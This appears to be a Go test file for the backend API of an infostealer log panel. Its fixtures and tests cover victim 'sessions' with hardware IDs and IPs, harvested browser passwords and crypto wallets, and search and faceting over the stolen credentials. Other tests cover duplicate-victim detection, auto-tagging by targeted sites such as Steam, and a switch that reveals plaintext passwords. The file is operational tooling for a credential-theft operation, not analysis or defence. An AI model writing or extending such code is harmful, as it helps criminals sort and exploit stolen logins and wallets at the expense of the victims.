package api_test

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"testing"

	"github.com/google/uuid"
)

func TestAdvancedSearch_Basic(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES (?, ?, 'https://example.com', 'alice', 'secret', 'chrome')`, uuid.New().String(), sid)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/search/advanced?q=example", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	if resp["total"].(float64) < 1 {
		t.Errorf("expected at least 1 result, got %v", resp["total"])
	}
	if resp["page"].(float64) != 1 {
		t.Errorf("expected page=1, got %v", resp["page"])
	}
	if resp["per_page"].(float64) != 50 {
		t.Errorf("expected per_page=50, got %v", resp["per_page"])
	}

	facets, ok := resp["facets"].(map[string]any)
	if !ok {
		t.Fatal("expected facets in response")
	}
	browsers, ok := facets["browsers"].(map[string]any)
	if !ok || len(browsers) == 0 {
		t.Errorf("expected non-empty browsers facet, got %v", browsers)
	}
}

func TestAdvancedSearch_FilterByOS(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	for i := 0; i < 3; i++ {
		sid := uuid.New().String()
		os := "win10"
		if i == 2 {
			os = "win11"
		}
		_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
			VALUES (?, 'b1', ?, ?, 'user', '1.2.3.4', 'US', datetime('now'))`, sid, "hw-"+sid[:8], os)
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/search/advanced?os=win11", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	results := resp["results"].([]any)
	if len(results) != 0 {
		t.Logf("expected 0 results (no passwords for win11), got %d", len(results))
	}
}

func TestAdvancedSearch_Pagination(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
	if err != nil {
		t.Fatal(err)
	}

	for i := 0; i < 5; i++ {
		_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
			VALUES (?, ?, 'test.com', 'user', 'pass', 'chrome')`, uuid.New().String(), sid)
		if err != nil {
			t.Fatal(err)
		}
	}

	req := httptest.NewRequest(http.MethodGet, "/api/search/advanced?q=test&per_page=2&page=1", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	results := resp["results"].([]any)
	if len(results) > 2 {
		t.Errorf("expected at most 2 results, got %d", len(results))
	}
	if resp["total"].(float64) != 5 {
		t.Errorf("expected total=5, got %v", resp["total"])
	}
}

func TestDuplicateDetection_ByHWID(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid1 := uuid.New().String()
	sid2 := uuid.New().String()
	sid3 := uuid.New().String()

	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'DUP-HWID', 'win10', 'user1', '1.2.3.4', 'US', datetime('now'))`, sid1)
	if err != nil {
		t.Fatal(err)
	}
	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'DUP-HWID', 'win10', 'user2', '5.6.7.8', 'US', datetime('now'))`, sid2)
	if err != nil {
		t.Fatal(err)
	}
	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'DUP-HWID', 'win11', 'user3', '9.10.11.12', 'DE', datetime('now'))`, sid3)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/detect/duplicates?hwid=DUP-HWID", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	hwid, ok := resp["hwid"].(map[string]any)
	if !ok {
		t.Fatal("expected hwid in response")
	}
	if hwid["count"].(float64) != 3 {
		t.Errorf("expected count=3, got %v", hwid["count"])
	}
	sessions := hwid["sessions"].([]any)
	if len(sessions) != 3 {
		t.Errorf("expected 3 sessions, got %d", len(sessions))
	}
}

func TestDuplicateDetection_ByIP(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid1 := uuid.New().String()
	sid2 := uuid.New().String()

	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hw1', 'win10', 'user1', '10.0.0.1', 'US', datetime('now'))`, sid1)
	if err != nil {
		t.Fatal(err)
	}
	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hw2', 'win10', 'user2', '10.0.0.1', 'US', datetime('now'))`, sid2)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/detect/duplicates?ip=10.0.0.1", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	ip, ok := resp["ip"].(map[string]any)
	if !ok {
		t.Fatal("expected ip in response")
	}
	if ip["count"].(float64) != 2 {
		t.Errorf("expected count=2, got %v", ip["count"])
	}
}

func TestDuplicateDetection_NoDuplicates(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'UNIQUE-HWID', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/detect/duplicates?hwid=UNIQUE-HWID", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	hwid := resp["hwid"].(map[string]any)
	if hwid["count"].(float64) != 1 {
		t.Errorf("expected count=1, got %v", hwid["count"])
	}
}

func TestDomainDetect_CreateListDelete(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	createBody := `{"domain":"steamcommunity.com","tag":"Steam","color":"#FF0000"}`
	req := httptest.NewRequest(http.MethodPost, "/api/domain-detect", bytes.NewReader([]byte(createBody)))
	req.Header.Set("Authorization", "Bearer "+token)
	req.Header.Set("Content-Type", "application/json")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusCreated {
		t.Fatalf("expected 201, got %d: %s", w.Code, w.Body.String())
	}

	var created map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &created); err != nil {
		t.Fatal(err)
	}
	if created["domain"] != "steamcommunity.com" {
		t.Errorf("expected domain=steamcommunity.com, got %v", created["domain"])
	}
	createdID := created["id"].(string)

	req2 := httptest.NewRequest(http.MethodGet, "/api/domain-detect", nil)
	req2.Header.Set("Authorization", "Bearer "+token)
	w2 := httptest.NewRecorder()
	r.ServeHTTP(w2, req2)

	if w2.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w2.Code, w2.Body.String())
	}

	var list []any
	if err := json.Unmarshal(w2.Body.Bytes(), &list); err != nil {
		t.Fatal(err)
	}
	if len(list) != 1 {
		t.Errorf("expected 1 item, got %d", len(list))
	}

	req3 := httptest.NewRequest(http.MethodDelete, "/api/domain-detect/"+createdID, nil)
	req3.Header.Set("Authorization", "Bearer "+token)
	w3 := httptest.NewRecorder()
	r.ServeHTTP(w3, req3)

	if w3.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w3.Code, w3.Body.String())
	}
}

func TestDomainDetect_AutoTag(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	_, err := d.Exec("INSERT INTO domain_detect (id, domain, tag, color) VALUES (?, ?, ?, ?)",
		uuid.New().String(), "example.com", "Test", "#00FF00")
	if err != nil {
		t.Fatal(err)
	}

	sid := uuid.New().String()
	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES (?, ?, 'https://example.com/login', 'alice', 'secret', 'chrome')`, uuid.New().String(), sid)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodPost, "/api/sessions/"+sid+"/auto-tag", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var tags []any
	if err := json.Unmarshal(w.Body.Bytes(), &tags); err != nil {
		t.Fatal(err)
	}
	if len(tags) != 1 {
		t.Errorf("expected 1 tag, got %d", len(tags))
	}
}

func TestSessionDetail_PasswordReveal(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO passwords (id, session_id, url, username, password_value, browser)
		VALUES (?, ?, 'https://example.com', 'alice', 'mysecretpass', 'chrome')`, uuid.New().String(), sid)
	if err != nil {
		t.Fatal(err)
	}

	// Without reveal param - passwords should be hidden
	req := httptest.NewRequest(http.MethodGet, "/api/sessions/"+sid, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	passwords := resp["passwords"].([]any)
	if len(passwords) > 0 {
		p := passwords[0].(map[string]any)
		if p["password_value"] != nil && p["password_value"] != "" {
			t.Errorf("expected hidden password to be empty, got %v", p["password_value"])
		}
	}

	// With reveal param and admin role - passwords should be visible
	req2 := httptest.NewRequest(http.MethodGet, "/api/sessions/"+sid+"?reveal_passwords=true", nil)
	req2.Header.Set("Authorization", "Bearer "+token)
	w2 := httptest.NewRecorder()
	r.ServeHTTP(w2, req2)

	if err := json.Unmarshal(w2.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	passwords = resp["passwords"].([]any)
	if len(passwords) > 0 {
		p := passwords[0].(map[string]any)
		if p["password_value"] != "mysecretpass" {
			t.Errorf("expected revealed password, got %v", p["password_value"])
		}
	}
}

func TestSessionDetail_WalletIcons(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO wallets (id, session_id, name, path)
		VALUES (?, ?, 'MetaMask', '/path/mm')`, uuid.New().String(), sid)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions/"+sid, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	wallets := resp["wallets"].([]any)
	if len(wallets) != 1 {
		t.Fatalf("expected 1 wallet, got %d", len(wallets))
	}
	wallet := wallets[0].(map[string]any)
	if wallet["icon"] != "🦊" {
		t.Errorf("expected fox emoji for MetaMask, got %v", wallet["icon"])
	}
	if wallet["name"] != "MetaMask" {
		t.Errorf("expected name=MetaMask, got %v", wallet["name"])
	}
}

func TestSessionMarkViewed(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodPatch, "/api/sessions/"+sid+"/viewed", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["viewed"] != true {
		t.Errorf("expected viewed=true, got %v", resp["viewed"])
	}

	var viewed int
	d.QueryRow("SELECT viewed FROM sessions WHERE id = ?", sid).Scan(&viewed)
	if viewed != 1 {
		t.Errorf("expected viewed=1 in db, got %d", viewed)
	}
}

func TestSessionList_UnviewedFilter(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid1 := uuid.New().String()
	sid2 := uuid.New().String()

	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at, viewed)
		VALUES (?, 'b1', 'hw1', 'win10', 'user1', '1.2.3.4', 'US', datetime('now'), 1)`, sid1)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at, viewed)
		VALUES (?, 'b1', 'hw2', 'win11', 'user2', '5.6.7.8', 'DE', datetime('now'), 0)`, sid2)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions?unviewed_only=true", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	items := resp["sessions"].([]any)
	if len(items) != 1 {
		t.Errorf("expected 1 unviewed session, got %d", len(items))
	}
}

func TestFilterPresets(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	req := httptest.NewRequest(http.MethodGet, "/api/filter-presets", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	presets := resp["presets"].([]any)
	if len(presets) == 0 {
		t.Error("expected non-empty presets")
	}

	found := false
	for _, p := range presets {
		preset := p.(map[string]any)
		if preset["name"] == "Steam" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected 'Steam' preset")
	}
}

func TestSessionDetail_ViewedField(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	sid := uuid.New().String()
	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', 'hw1', 'win10', 'user', '1.2.3.4', 'US', datetime('now'))`, sid)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions/"+sid, nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	if resp["viewed"] != nil {
		v := resp["viewed"].(float64)
		if v != 0 {
			t.Errorf("expected viewed=0, got %v", v)
		}
	}
}

func TestSessionList_DuplicateCount(t *testing.T) {
	d := openTestDB(t)
	r, token := setupTestRouter(t, d, nil)

	hwid := "DUP-HWID-001"
	sid1 := uuid.New().String()
	sid2 := uuid.New().String()

	_, err := d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', ?, 'win10', 'user1', '1.2.3.4', 'US', datetime('now'))`, sid1, hwid)
	if err != nil {
		t.Fatal(err)
	}

	_, err = d.Exec(`INSERT INTO sessions (id, build_id, hwid, os, username, ip, country_code, created_at)
		VALUES (?, 'b1', ?, 'win11', 'user2', '5.6.7.8', 'DE', datetime('now'))`, sid2, hwid)
	if err != nil {
		t.Fatal(err)
	}

	req := httptest.NewRequest(http.MethodGet, "/api/sessions", nil)
	req.Header.Set("Authorization", "Bearer "+token)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	var resp map[string]any
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}

	items := resp["sessions"].([]any)
	for _, item := range items {
		it := item.(map[string]any)
		if it["hwid"] == hwid {
			dup := it["duplicate_count"].(float64)
			if dup != 1 {
				t.Errorf("expected duplicate_count=1 for hwid %s, got %v", hwid, dup)
			}
		}
	}
}
